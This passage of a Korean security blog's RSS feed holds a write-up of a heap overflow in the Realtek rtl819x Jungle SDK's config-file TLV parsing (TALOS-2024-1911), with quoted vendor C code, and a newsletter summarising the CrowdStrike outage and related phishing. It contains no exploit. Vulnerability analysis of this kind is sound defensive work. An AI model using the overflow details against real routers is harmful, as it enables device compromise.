      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://talosintelligence.com/vulnerability_reports/TALOS-2024-1911">https://talosintelligence.com/vulnerability_reports/TALOS-2024-1911</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>LevelOne WBR-6013 RER4_A_v3411b_2T2R_LEV_09_170623</li><li>Realtek rtl819x Jungle SDK v3.4.11</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>rtl819x Jungle SDK&#xB294; &#xB77C;&#xC6B0;&#xD130;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; SDK(Software Development Kit)&#xB85C; &#xC6F9;&#xC11C;&#xBC84;&#xB85C;&#xB294; Boa&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xBB34;&#xC120; &#xACF5;&#xC720;&#xAE30;&#xC778; LevelOne WBR-6013&#xC5D0; &#xC774; SDK&#xAC00; &#xC0AC;&#xC6A9;&#xB418;&#xC5C8;&#xC73C;&#xBA70; &#xB77C;&#xC6B0;&#xD130;&#xC758; &#xD658;&#xACBD;&#xC124;&#xC815;&#xC744; &#xBCC0;&#xACBD;&#xD558;&#xAE30; &#xC704;&#xD574; <code>/boafrm/formUploadConfig</code> API&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; &#xD658;&#xACBD;&#xC124;&#xC815; &#xD30C;&#xC77C;&#xC744; &#xC5C5;&#xB85C;&#xB4DC;&#xD558;&#xAC8C; &#xB418;&#xB294;&#xB370; &#xC774; &#xD30C;&#xC77C;&#xC744; &#xD30C;&#xC2F1;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD658;&#xACBD;&#xC124;&#xC815; &#xD30C;&#xC77C;&#xC5D0;&#xB294; &#xB2E4;&#xC591;&#xD55C; &#xC635;&#xC158;&#xB4E4;&#xC774; TLV(type, length, value) &#xD615;&#xC2DD;&#xC73C;&#xB85C; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA70; &#xC544;&#xB798;&#xC758; <code>mid_init_vaule</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xB370;&#xC774;&#xD130;&#xAC00; &#xBCF5;&#xC0AC;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">File: apmib.c<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">mib_init_value</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *ptlv_data_value, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> tlv_len, <span class="hljs-keyword">const</span> mib_table_entry_T *mib_tbl, <span class="hljs-keyword">void</span> *data)</span></span><span class="hljs-function"></span>{    <span class="hljs-comment">/*[...]*/</span>    <span class="hljs-keyword">switch</span> (mib_tbl-&gt;type)    {        <span class="hljs-keyword">case</span> BYTE_T:        <span class="hljs-keyword">case</span> BYTE_ARRAY_T:        <span class="hljs-keyword">case</span> DWORD_ARRAY_T:            pChar = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *) data;[<span class="hljs-number">1</span>]         <span class="hljs-built_in">memcpy</span>(data, ptlv_data_value, tlv_len);            <span class="hljs-keyword">break</span>;     <span class="hljs-comment">/*[...]*/</span>    }    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;}</code></pre><p>&#xC704; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; <code>memcpy</code>&#xC758; &#xC778;&#xC790;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; <code>tlv_len</code>&#xC740; &#xD30C;&#xC77C;&#xC5D0;&#xC11C; &#xC720;&#xB798;&#xD55C; &#xAC12;&#xC73C;&#xB85C; &#xB370;&#xC774;&#xD130;&#xAC00; &#xBCF5;&#xC0AC;&#xB420; &#xBA54;&#xBAA8;&#xB9AC;&#xC778; <code>data</code>&#xC758; &#xD06C;&#xAE30;&#xBCF4;&#xB2E4; &#xD06C;&#xC9C0; &#xC54A;&#xC740;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC774; &#xC5C6;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><code>data</code>&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xB294; &#xACE0;&#xC815;&#xB41C; &#xD06C;&#xAE30;&#xB97C; &#xAC00;&#xC9C0;&#xB294; &#xD799; &#xBC84;&#xD37C;&#xB85C; &#xC544;&#xB798;&#xC758; <code>apmib_load_csconf</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; 0x924d &#xD06C;&#xAE30;&#xB85C; &#xD560;&#xB2F9;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">File: apmib.c<span class="hljs-function"><span class="hljs-keyword">char</span> *<span class="hljs-title">apmib_load_csconf</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span>{    <span class="hljs-comment">/*[...]*/</span>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">memcmp</span>(compHeader.signature, COMP_CS_SIGNATURE, COMP_SIGNATURE_LEN) == <span class="hljs-number">0</span> ) <span class="hljs-comment">//check whether compress mib data</span>    {[<span class="hljs-number">2</span>]     curMibData = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(APMIB_T)+<span class="hljs-number">1</span>); <span class="hljs-comment">// 1: checksum</span>    <span class="hljs-comment">/*[...]*/</span>[<span class="hljs-number">3</span>]     <span class="hljs-keyword">if</span>(tlv_checksum == <span class="hljs-number">1</span> &amp;&amp; mib_tlv_init(pmib_tl, expFile+<span class="hljs-keyword">sizeof</span>(PARAM_HEADER_T), (<span class="hljs-keyword">void</span>*)curMibData, tlv_content_len) == <span class="hljs-number">1</span>) <span class="hljs-comment">/* According to pmib_tl, get value from expFile to hwMibData. parse total len is  tlv_content_len*/</span>    {    <span class="hljs-comment">/*[...]*/</span></code></pre><p><code>[2]</code>&#xC5D0;&#xC11C; <code>malloc</code>&#xC73C;&#xB85C; &#xD560;&#xB2F9;&#xB41C; &#xBC84;&#xD37C;&#xAC00; <code>[3]</code>&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xB418;&#xB294; <code>mid_tlv_init</code>&#xC758; &#xC778;&#xC790;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xACE0; &#xC774;&#xB294; &#xB2E4;&#xC2DC; <code>mid_init_value</code> &#xD638;&#xCD9C;&#xC758; &#xC778;&#xC790;(<code>data</code>)&#xB85C; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C; TLV &#xB370;&#xC774;&#xD130;&#xC758; &#xAE38;&#xC774;&#xB97C; 0x924d&#xBCF4;&#xB2E4; &#xD06C;&#xAC8C; &#xC124;&#xC815;&#xD558;&#xAC8C; &#xB41C;&#xB2E4;&#xBA74; <code>data</code>&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xD799; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C; &#xBC84;&#xD37C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xACE0; &#xC608;&#xC2DC;&#xB85C; &#xC0AC;&#xC6A9;&#xB41C; <code>DWORD_ARRAY_T</code> &#xD0C0;&#xC785; &#xC678;&#xC5D0;&#xB3C4; &#xB2E4;&#xC591;&#xD55C; &#xD0C0;&#xC785;&#xC5D0;&#xC11C; &#xAC19;&#xC740; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xB418;&#xB294; &#xB370;&#xC774;&#xD130;&#xC640; &#xB370;&#xC774;&#xD130;&#xC758; &#xAE38;&#xC774;&#xB97C; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC778;&#xC811;&#xD55C; &#xD799; &#xCCAD;&#xD06C;&#xC758; &#xB370;&#xC774;&#xD130;&#xB97C; &#xB36E;&#xC5B4;&#xC4F0;&#xB294; &#xB4F1;&#xC758; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xC784;&#xC758; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC73C;&#xB85C;&#xB3C4; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/heap-overflow/">heap overflow</category>
      
      <category domain="https://hackyboiz.github.io/tags/pwndorei/">pwndorei</category>
      
      <category domain="https://hackyboiz.github.io/tags/Realtek/">Realtek</category>
      
      
      <comments>https://hackyboiz.github.io/2024/07/31/pwndorei/2024-07-31/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[해킹짹짹🐣] CrowdStrike 사태, 현재까지 공개된 정보 총 정리</title>
      <link>https://hackyboiz.github.io/2024/07/29/hunjison/newsletter0729/</link>
      <guid>https://hackyboiz.github.io/2024/07/29/hunjison/newsletter0729/</guid>
      <pubDate>Mon, 29 Jul 2024 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;, hunjison&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xBC88; &amp;#xC8FC;&amp;#xB294; CrowdStrike &amp;#xD2B9;</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;, hunjison&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xBC88; &#xC8FC;&#xB294; CrowdStrike &#xD2B9;&#xC9D1;&#xC785;&#xB2C8;&#xB2E4;! &#xC0AC;&#xAC74;&#xC758; &#xD575;&#xC2EC; &#xC6D0;&#xC778;&#xBD80;&#xD130; &#xACF5;&#xACA9;&#xC790;&#xB4E4;&#xC758; &#xC545;&#xC6A9;&#xAE4C;&#xC9C0; &#xD604;&#xC7AC; &#xACF5;&#xAC1C;&#xB41C; &#xC815;&#xBCF4;&#xB97C; &#xCD1D; &#xC815;&#xB9AC;&#xD574;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4; &#x1F60E; &#xB3C4;&#xC6C0;&#xC774; &#xB418;&#xC5C8;&#xC73C;&#xBA74; &#xC88B;&#xACA0;&#xC5B4;&#xC694;.</p><h2 id="&#xC774;&#xBC88;-&#xC8FC;-&#xC9F9;&#xC9F9;-PICK&#x1F425;"><a href="#&#xC774;&#xBC88;-&#xC8FC;-&#xC9F9;&#xC9F9;-PICK&#x1F425;" class="headerlink" title="&#xC774;&#xBC88; &#xC8FC; &#xC9F9;&#xC9F9; PICK&#x1F425;"></a>&#xC774;&#xBC88; &#xC8FC; &#xC9F9;&#xC9F9; PICK&#x1F425;</h2><blockquote><p>&#x1F5E3;&#xFE0F; <strong>CrowdStrike &#xC0AC;&#xD0DC;, &#xD604;&#xC7AC;&#xAE4C;&#xC9C0; &#xACF5;&#xAC1C;&#xB41C; &#xC815;&#xBCF4; &#xCD1D; &#xC815;&#xB9AC;</strong></p></blockquote><p>CrowdStrike &#xC0AC;&#xD0DC;&#xC640; &#xAD00;&#xB828;&#xD574; &#xACF5;&#xC2DD;&#xC801;&#xC73C;&#xB85C; &#xC0AC;&#xACE0; &#xD6C4; &#xBCF4;&#xACE0;&#xC11C;(PIR)&#xC774; &#xBC1C;&#xD45C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;</p><p>&#xD604;&#xC7AC;&#xAE4C;&#xC9C0; &#xD30C;&#xC545;&#xB41C; &#xC0AC;&#xAC74;&#xC758; &#xC6D0;&#xC778;&#xBD80;&#xD130; &#xACF5;&#xACA9;&#xC790;&#xB4E4;&#xC758; &#xC545;&#xC6A9;&#xAE4C;&#xC9C0; &#xC2F9; &#xB2E4; &#xC815;&#xB9AC;&#xD574;&#xBCFC;&#xAC8C;&#xC694;!</p><p><img src="/2024/07/29/hunjison/newsletter0729/image1.png" alt="&#xAE30;&#xC0AC;&#xC0AC;&#xC9C4;"></p><ol><li><p><strong>CrowdStrike &#xC0AC;&#xD0DC;&#xB780;? | <a href="https://hackyboiz.github.io/2024/07/22/clalxk/newsletter0722/">&#xCC38;&#xACE0;</a></strong></p><p> &#xC9C0;&#xB09C; 7&#xC6D4; 19&#xC77C; &#xAE08;&#xC694;&#xC77C; &#xD55C;&#xAD6D; &#xC2DC;&#xAC04; &#xAE30;&#xC900; &#xC624;&#xD6C4; 1&#xC2DC; 9&#xBD84;&#xBD80;&#xD130; 2&#xC2DC; 27&#xBD84;&#xAE4C;&#xC9C0; CrowdStrike &#xC0AC;&#xC758; Falcon Sensor &#xC81C;&#xD488;&#xC758; &#xC790;&#xB3D9; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xAC00; &#xC9C4;&#xD589;&#xB418;&#xBA74;&#xC11C;, Windows&#xC5D0;&#xC11C; &#xBE14;&#xB8E8;&#xC2A4;&#xD06C;&#xB9B0;(BSOD, Blue Screen of Death)&#xC774; &#xBC1C;&#xC0DD;&#xD55C; &#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;.</p><p> CrowdStrike Falcon&#xC740; &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8; &#xD0D0;&#xC9C0; &#xBC0F; &#xB300;&#xC751;(EDR) &#xBC0F; &#xC548;&#xD2F0; &#xBC14;&#xC774;&#xB7EC;&#xC2A4; &#xAE30;&#xB2A5;&#xC744; &#xC218;&#xD589;&#xD558;&#xB294; &#xC81C;&#xD488;&#xC73C;&#xB85C;, 2022&#xB144; 1&#xC6D4; &#xAE30;&#xC900; &#xD574;&#xB2F9; &#xBD80;&#xBB38; &#xC2DC;&#xC7A5; &#xC810;&#xC720;&#xC728;&#xC774; 14.2%&#xB85C; 1&#xC704;&#xC5D0; &#xD574;&#xB2F9;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;(<a href="https://www.crowdstrike.com/press-releases/crowdstrike-ranks-1-for-modern-endpoint-security-market-shares/">&#xCD9C;&#xCC98;</a>). </p><p> &#xC774;&#xBC88; &#xC0AC;&#xD0DC;&#xB294; Windows &#xC6B4;&#xC601;&#xCCB4;&#xC81C;&#xC5D0;&#xB9CC; &#xC601;&#xD5A5;&#xC744; &#xC8FC;&#xC5C8;&#xC9C0;&#xB9CC;, &#xC804; &#xC138;&#xACC4;&#xC758; &#xBAA8;&#xB4E0; Windows PC&#xAC00; &#xB9D0; &#xADF8;&#xB300;&#xB85C; &#xBA39;&#xD1B5;&#xC774; &#xB418;&#xC5C8;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC2EC;&#xAC01;&#xD55C; &#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;.</p></li></ol><ol><li><p><strong>CrowdStrike&#xC5D0;&#xC11C; &#xBC1D;&#xD78C; &#xC0AC;&#xAC74;&#xC758; &#xC6D0;&#xC778; | <a href="https://www.crowdstrike.com/falcon-content-update-remediation-and-guidance-hub/">&#xCD9C;&#xCC98;</a></strong></p><p> &#xC774;&#xBC88; &#xC0AC;&#xAC74;&#xC740; Falcon &#xD50C;&#xB7AB;&#xD3FC;&#xC758; Rapid Response Content &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB85C; &#xC778;&#xD574; &#xBC1C;&#xC0DD;&#xD588;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><p> Rapid Response Content&#xB780; Falcon&#xC774; Windows&#xC5D0; &#xB300;&#xD55C; &#xB3D9;&#xC801; &#xBCF4;&#xD638;&#xB97C; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD558;&#xAE30; &#xC704;&#xD574;, &#xC13C;&#xC11C;&#xAC00; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC218;&#xC9D1;&#xD558;&#xACE0; &#xC545;&#xC758;&#xC801; &#xD589;&#xB3D9; &#xC9C0;&#xD45C;&#xB97C; &#xC2DD;&#xBCC4;&#xD558;&#xACE0; &#xACF5;&#xACA9;&#xC744; &#xD0D0;&#xC9C0; &#xD639;&#xC740; &#xC608;&#xBC29;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xAD6C;&#xC131;&#xD558;&#xB294; &#xC5ED;&#xD560;&#xC744; &#xD569;&#xB2C8;&#xB2E4;. &#xB4A4;&#xC774;&#xC5B4; &#xC124;&#xBA85;&#xD560; IPC &#xD15C;&#xD50C;&#xB9BF; &#xC778;&#xC2A4;&#xD134;&#xC2A4; &#xC5ED;&#xC2DC; Rapid Response Content&#xC758; &#xD55C; &#xC720;&#xD615;&#xC785;&#xB2C8;&#xB2E4;.</p><p> &#xC774;&#xBC88; &#xC0AC;&#xD0DC;&#xC5D0;&#xC11C;&#xB294; 2&#xAC1C;&#xC758; IPC(InterProcessCommunication) &#xD15C;&#xD50C;&#xB9BF; &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xAC00; &#xCD94;&#xAC00;&#xB85C; &#xBC30;&#xD3EC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBC30;&#xD3EC; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xCF58;&#xD150;&#xCE20; &#xAC80;&#xC99D;&#xAE30;(Content Validator)&#xC758; &#xBC84;&#xADF8;&#xB85C; &#xC778;&#xD574; &#xD574;&#xB2F9; &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xB4E4;&#xC774; &#xBC30;&#xD3EC;&#xB418;&#xC5C8;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xB4E4;&#xC740; &#xCC44;&#xB110; &#xD30C;&#xC77C; 291(<code>%WINDIR%\System32\drivers\CrowdStrike\C-00000291*.sys</code>)&#xC5D0; &#xD3EC;&#xD568;&#xB418;&#xC5C8;&#xC73C;&#xBA70;, &#xBC94;&#xC704;&#xB97C; &#xBC97;&#xC5B4;&#xB09C; &#xBA54;&#xBAA8;&#xB9AC; &#xC77D;&#xAE30;(out-of-bounds memory read)&#xB97C; &#xC77C;&#xC73C;&#xCF1C; Windows &#xC2DC;&#xC2A4;&#xD15C; &#xD06C;&#xB798;&#xC2DC;&#xB97C; &#xC720;&#xBC1C;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li><li><p><strong>QA &#xAD00;&#xC810;&#xC5D0;&#xC11C; &#xC0B4;&#xD3B4;&#xBCF8; CrowdStrike &#xC0AC;&#xAC74; | <a href="https://qase.io/blog/crowdstrike-outage-from-a-qa-perspective/">&#xCC38;&#xACE0;</a></strong></p><p> &#xC774;&#xBC88; &#xC0AC;&#xAC74;&#xC758; &#xAC00;&#xC7A5; &#xD070; &#xBB38;&#xC81C;&#xC810;&#xC740; CrowdStrike &#xC0AC;&#xC758; &#xD488;&#xC9C8;&#xBCF4;&#xC99D;(QA) &#xAD00;&#xB9AC; &#xCCB4;&#xACC4;&#xAC00; &#xC9C0;&#xB098;&#xCE58;&#xAC8C; &#xD5C8;&#xC220;&#xD588;&#xB2E4;&#xB294; &#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><p> CrowdStrike &#xC0AC;&#xC5D0;&#xC11C; &#xC774;&#xBC88; &#xBB38;&#xC81C;&#xC758; &#xD575;&#xC2EC; &#xC6D0;&#xC778;&#xC73C;&#xB85C; &#x201C;&#xCF58;&#xD150;&#xCE20; &#xAC80;&#xC99D;&#xAE30;&#xC758; &#xBC84;&#xADF8;&#x201D;&#xB97C; &#xAF3D;&#xACE0; &#xC788;&#xC73C;&#xBA70;, &#xC774;&#xC5D0; &#xB300;&#xD55C; &#xB300;&#xCC45;&#xC73C;&#xB85C; &#xB85C;&#xCEEC; &#xAC1C;&#xBC1C;&#xC790; &#xD14C;&#xC2A4;&#xD2B8;, &#xCF58;&#xD150;&#xCE20; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xBC0F; &#xB864;&#xBC31; &#xD14C;&#xC2A4;&#xD2B8;, &#xC548;&#xC815;&#xC131; &#xD14C;&#xC2A4;&#xD2B8; &#xB4F1; &#xD14C;&#xC2A4;&#xD2B8; &#xAC15;&#xD654;&#xB97C; &#xAF3D;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p> &#xCC38;&#xACE0; &#xB9C1;&#xD06C;&#xC5D0;&#xC11C; &#xD55C; &#xC804;&#xBB38;&#xAC00;&#xB294; CrowdStrike&#xAC00; &#xC9C0;&#xB098;&#xCE58;&#xAC8C; &#xBE44;&#xC6A9;&#xC744; &#xB0AE;&#xCD98; &#xAC83; &#xAC19;&#xB2E4;&#xACE0; &#xC774;&#xC57C;&#xAE30;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li><li><p><strong>&#xC0AC;&#xD0DC; &#xD574;&#xACB0; &#xBC0F; &#xACF5;&#xACA9;&#xC790;&#xB4E4;&#xC758; &#xC545;&#xC6A9; | <a href="https://boannews.com/media/view.asp?idx=131510&amp;page=7&amp;kind=1">&#xCC38;&#xACE0;1</a>, <a href="https://www.crowdstrike.com/blog/lumma-stealer-with-cypherit-phishing-lure/">&#xCC38;&#xACE0;2</a></strong></p><p> Microsoft&#xC5D0;&#xC11C;&#xB294; &#xC774;&#xBC88; &#xC0AC;&#xD0DC;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD574; &#xBCF5;&#xAD6C; &#xBC29;&#xBC95;&#xC744; <a href="https://blogs.microsoft.com/blog/2024/07/20/helping-our-customers-through-the-crowdstrike-outage/">&#xC801;&#xADF9;&#xC801;&#xC73C;&#xB85C; &#xC81C;&#xACF5;</a>&#xD558;&#xACE0; &#xC788;&#xC73C;&#xBA70;, &#xAD6D;&#xB0B4;&#xC5D0;&#xC11C;&#xB294; KISA &#xC5D0;&#xC11C; <a href="https://www.boho.or.kr/kr/bbs/view.do?bbsId=B0000133&amp;pageIndex=1&amp;nttId=71499&amp;menuNo=205020">&#xAE34;&#xAE09; &#xC870;&#xCE58; &#xBC29;&#xC548;</a>&#xC744; &#xB9C8;&#xB828;&#xD558;&#xC5EC; &#xBC30;&#xD3EC;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p> &#xD55C;&#xD3B8; &#xACF5;&#xACA9;&#xC790;&#xB4E4;&#xC740; &#xAC00;&#xC9DC; &#xBCF5;&#xAD6C; &#xB3C4;&#xAD6C;&#xB4E4;&#xC744; &#xC720;&#xD3EC;&#xD558;&#xAC70;&#xB098; &#xC774;&#xBC88; &#xC0AC;&#xD0DC;&#xB97C; &#xD574;&#xACB0;&#xD560; &#xC218; &#xC788;&#xB294; &#xD56B;&#xD53D;&#xC2A4;&#xB77C;&#xACE0; &#xC18D;&#xC5EC; &#xBA40;&#xC6E8;&#xC5B4;&#xB97C; &#xBC30;&#xD3EC;&#xD558;&#xAE30;&#xB3C4; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. CrowdStrike&#xB97C; &#xAC00;&#xC7A5;&#xD55C; &#xACF5;&#xACA9;&#xC790;&#xB4E4;&#xC774; Falcon &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB77C;&#xACE0; &#xC18D;&#xC774;&#xB294; &#xD53C;&#xC2F1; &#xBA54;&#xC77C; &#xB610;&#xD55C; &#xAD00;&#xCC30;&#xB418;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p></li><li><p><strong>&#xC0AC;&#xAC74;&#xC758; &#xD575;&#xC2EC; &#xC6D0;&#xC778;&#xC740; &#xC544;&#xC9C1; &#xBBF8;&#xACF5;&#xAC1C; | <a href="https://www.crowdstrike.com/blog/falcon-update-for-windows-hosts-technical-details/">&#xCD9C;&#xCC98;</a></strong></p><p> CrowdStrike&#xC758; PIR &#xBCF4;&#xACE0;&#xC11C;&#xC5D0;&#xC11C;&#xB294; QA &#xAD00;&#xC810;&#xC5D0;&#xC11C;&#xC758; &#xC6D0;&#xC778;&#xC5D0; &#xB300;&#xD574; &#x201C;&#xCF58;&#xD150;&#xCE20; &#xAC80;&#xC99D;&#xAE30;&#xC758; &#xBC84;&#xADF8;&#x201D;&#xAC00; &#xC788;&#xC5C8;&#xB2E4;&#xACE0; &#xB9D0;&#xD560; &#xBFD0;, &#xC790;&#xC138;&#xD55C; &#xB0B4;&#xC6A9;&#xC744; &#xACF5;&#xAC1C;&#xD558;&#xC9C0; &#xC54A;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; &#xD574;&#xB2F9; IPC &#xD15C;&#xD50C;&#xB9BF; &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xAC00; &#xC65C; OOB read&#xB97C; &#xC77C;&#xC73C;&#xCF30;&#xB294;&#xC9C0;&#xC5D0; &#xB300;&#xD55C; &#xC0C1;&#xC138;&#xD55C; &#xC124;&#xBA85; &#xC5ED;&#xC2DC; &#xBE60;&#xC838; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p> CrowdStrike &#xD648;&#xD398;&#xC774;&#xC9C0;&#xC5D0; &#xB530;&#xB974;&#xBA74; &#xC774;&#xC5D0; &#xB300;&#xD55C; &#xADFC;&#xBCF8; &#xC6D0;&#xC778; &#xBD84;&#xC11D;&#xC774; &#xC218;&#xD589;&#xB418;&#xACE0; &#xC788;&#xC73C;&#xBA70; &#xBCF4;&#xACE0;&#xC11C; &#xC5ED;&#xC2DC; &#xC774;&#xD6C4; &#xACF5;&#xAC1C;&#xB41C;&#xB2E4;&#xACE0; &#xD558;&#xB2C8;, &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB97C; &#xC9C0;&#xCF1C;&#xBD10;&#xC57C; &#xD560; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li></ol><hr><h3 id="&#xC9C0;&#xC2DD;-PLUS-&#x2795;"><a href="#&#xC9C0;&#xC2DD;-PLUS-&#x2795;" class="headerlink" title="&#xC9C0;&#xC2DD; PLUS &#x2795;"></a>&#xC9C0;&#xC2DD; PLUS &#x2795;</h3><ul><li><a href="https://trufflesecurity.com/blog/anyone-can-access-deleted-and-private-repo-data-github">Anyone can Access Deleted and Private Repository Data on GitHub</a></li><li><a href="https://security.googleblog.com/2024/06/virtual-escape-real-reward-introducing.html">Virtual Escape; Real Reward: Introducing Google&#x2019;s kvmCTF</a></li><li><a href="https://securityonline.info/cve-2024-40767-openstack-nova-vulnerability-exposes-cloud-servers-to-data-theft-risk/#google_vignette">CVE-2024-40767: OpenStack Nova Vulnerability Exposes Cloud Servers to Data Theft Risk</a></li><li><a href="https://cloud.google.com/blog/topics/threat-intelligence/apt45-north-korea-digital-military-machine?hl=en">APT45: North Korea&#x2019;s Digital Military Machine</a></li><li><a href="https://www.yna.co.kr/view/AKR20240726002951071?input=1195m">&#x7F8E;, &#x5317;&#xD574;&#xCEE4; &#xAE30;&#xC18C;&#xB7;&#xD604;&#xC0C1;&#xC218;&#xBC30;&#x2026;&#x201D;&#x7F8E;&#xB7;&#x97D3;&#xB7;&#x4E2D; &#xC815;&#xBD80;&#xB7;&#xC5C5;&#xCCB4; &#xD574;&#xD0B9;&#x201D;(&#xC885;&#xD569;)</a></li></ul><h2 id="7&#xC6D4;-&#xCEE8;&#xD37C;&#xB7F0;&#xC2A4;-&#xB300;&#xD68C;-&#x1F425;"><a href="#7&#xC6D4;-&#xCEE8;&#xD37C;&#xB7F0;&#xC2A4;-&#xB300;&#xD68C;-&#x1F425;" class="headerlink" title="7&#xC6D4; &#xCEE8;&#xD37C;&#xB7F0;&#xC2A4; | &#xB300;&#xD68C; &#x1F425;"></a><strong>7&#xC6D4; &#xCEE8;&#xD37C;&#xB7F0;&#xC2A4; | &#xB300;&#xD68C;</strong> &#x1F425;</h2><p><a href="https://www.kisa.or.kr/401/form?postSeq=3304&amp;page=1">AI+SECURITY &#xC544;&#xC774;&#xB514;&#xC5B4; &#xACF5;&#xBAA8;&#xC804;</a> | ~24.08.12 16&#xC2DC;</p><p><a href="https://cryptocontest.kr/challenge/">&#xC554;&#xD638;&#xBD84;&#xC11D;&#xACBD;&#xC9C4;&#xB300;&#xD68C;</a> | &#xD55C;&#xAD6D;&#xC815;&#xBCF4;&#xBCF4;&#xD638;&#xD559;&#xD68C; | ~24.08.31 </p><p><a href="http://www.itdaily.kr/news/articleView.html?idxno=223547">&#xAE08;&#xC735;&#xAD8C; &#xBCF4;&#xC548; &#xCDE8;&#xC57D;&#xC810; 